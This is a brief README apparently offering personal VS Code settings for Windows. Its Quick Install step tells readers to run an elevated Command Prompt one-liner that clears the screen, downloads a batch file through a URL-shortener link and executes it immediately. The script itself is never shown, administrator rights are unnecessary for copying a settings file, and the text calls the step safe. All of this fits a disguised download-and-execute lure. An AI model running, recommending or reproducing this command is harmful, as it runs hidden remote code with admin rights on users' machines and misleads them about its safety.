# 🧩 VSCode Config

Personalized **VS Code settings** for a clean, productive setup.

## ⚙️ What This Does

* Backs up your existing `settings.json`
* Downloads and applies my preferred `settings.json`
* Works on **Windows (all editions)**
* Safe to run — creates a `.bak` backup automatically

---

## 🚀 Quick Install

Run this in **Command Prompt (as Administrator):**

```bat
cd %userprofile% && cls && curl -fsSL https://v.gd/setcodewin -o set.bat && set.bat
```

That’s it. Sit back and let it configure VS Code automatically.

## 🧰 Notes

* Backup file is stored as `settings.json.bak`
* Target folder: `%AppData%\Code\User`
* You can manually edit or restore it anytime.
